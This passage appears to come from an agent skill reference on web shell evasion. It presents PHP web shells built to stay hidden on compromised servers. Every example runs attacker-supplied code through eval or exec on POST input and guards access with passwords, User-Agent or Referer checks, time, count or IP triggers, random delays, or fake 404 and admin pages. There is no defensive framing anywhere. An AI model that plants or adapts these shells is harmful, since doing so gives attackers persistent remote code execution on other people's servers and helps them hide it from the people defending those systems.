### 2.1 Password / Key Verification

The most basic dynamic defense: refuse to execute without the correct password.

**PHP Example:**

```php
<?php
$password = 'mypass2026!@#';
if (!isset($_POST['pass']) || $_POST['pass'] !== $password) {
    header('HTTP/1.1 404 Not Found');
    die('<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}
@eval($_POST['code']);
?>
```

**PHP Example — Multi-factor password verification:**

```php
<?php
$pw1 = $_POST['auth'] ?? '';
$pw2 = $_SERVER['HTTP_X_AUTH_TOKEN'] ?? '';
$pw3 = $_COOKIE['session_id'] ?? '';
$expected_hash = 'a1b2c3d4e5f6...'; // SHA256 of expected values

if (hash('sha256', $pw1 . $pw2 . $pw3 . $_SERVER['HTTP_USER_AGENT']) !== $expected_hash) {
    http_response_code(403);
    exit('Access Denied');
}
// Execute payload
eval($_POST['code']);
?>
```

### 2.2 User-Agent Whitelisting

Only respond to requests with a specific User-Agent string.

**PHP Example:**

```php
<?php
$allowed_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
if ($_SERVER['HTTP_USER_AGENT'] !== $allowed_ua) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

**PHP Example — User-Agent regex pattern matching:**

```php
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if (!preg_match('/^Mozilla\/5\.0 \(.*\) AppleWebKit\/537\.36.*Chrome\/1[2-9]\d/', $ua)) {
    header('HTTP/1.1 403 Forbidden');
    exit;
}
if (!isset($_POST['p']) || $_POST['p'] !== 's3cr3t') {
    exit;
}
eval($_POST['c']);
?>
```

### 2.3 Referer / Origin Validation

Require a specific Referer header to prevent automated scanners from triggering the WebShell.

**PHP Example:**

```php
<?php
$allowed_ref = 'https://admin.internal.example.com/';
if (!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], $allowed_ref) !== 0) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

### 2.4 Time-based / Conditional Activation

The WebShell only activates during specific time windows or after a certain number of requests.

**PHP Example — Time window activation:**

```php
<?php
// Only activate between 02:00 and 04:00 UTC
$hour = (int)date('H');
if ($hour < 2 || $hour > 4) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

**PHP Example — N-th request activation:**

```php
<?php
$counter_file = '/tmp/.cache_counter';
$count = (int)@file_get_contents($counter_file);
$count++;
@file_put_contents($counter_file, $count);
// Only activate on 3rd, 7th, or 13th request
if (!in_array($count, [3, 7, 13])) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

**PHP Example — IP-based activation (only from specific IP range):**

```php
<?php
$allowed_ips = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
$remote_ip = $_SERVER['REMOTE_ADDR'];
$allowed = false;
foreach ($allowed_ips as $cidr) {
    if (ip_in_cidr($remote_ip, $cidr)) { $allowed = true; break; }
}
if (!$allowed) { http_response_code(404); exit; }
eval($_POST['code']);

function ip_in_cidr($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    $mask_long = -1 << (32 - $mask);
    return ($ip_long & $mask_long) === ($subnet_long & $mask_long);
}
?>
```

### 2.5 Delay Execution

Introduce a random delay to evade time-based detection mechanisms.

**PHP Example:**

```php
<?php
// Random sleep between 1-5 seconds
sleep(rand(1, 5));
// Or microsecond sleep
usleep(rand(500000, 2000000));
@eval($_POST['code']);
?>
```

### 2.6 Traffic Masquerading

Return legitimate-looking responses to blend in with normal traffic.

**PHP Example — Fake 404 page:**

```php
<?php
if (!isset($_POST['secret']) || $_POST['secret'] !== 'mypass') {
    header('HTTP/1.1 404 Not Found');
    ?>
    <!DOCTYPE html>
    <html><head><title>404 Not Found</title>
    <style>body{font-family:Arial;text-align:center;padding:50px;}
    h1{font-size:50px;color:#333;}</style></head>
    <body><h1>404</h1><p>The page you requested was not found.</p></body></html>
    <?php
    exit;
}
$result = '';
exec($_POST['cmd'], $output);
foreach ($output as $line) { $result .= $line . "\n"; }
?>
<!DOCTYPE html>
<html><head><title>Admin Panel</title></head>
<body><h1>System Status</h1><pre><?php echo htmlspecialchars($result); ?></pre></body></html>
```



---
📖 本切片 1/2 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-02-webshell-dynamic-evasion-02.md")`